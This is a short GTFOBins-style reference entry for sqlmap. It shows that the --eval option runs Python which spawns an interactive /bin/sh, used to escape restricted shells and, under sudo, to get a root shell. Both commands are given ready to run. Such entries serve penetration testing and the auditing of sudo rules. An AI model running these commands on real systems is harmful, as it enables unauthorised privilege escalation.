# GTFOBin: sqlmap

This allows to execute `python` code, other functions may apply.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
sqlmap -u 127.0.0.1 --eval="import os; os.system('/bin/sh')"
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo sqlmap -u 127.0.0.1 --eval="import os; os.system('/bin/sh')"
```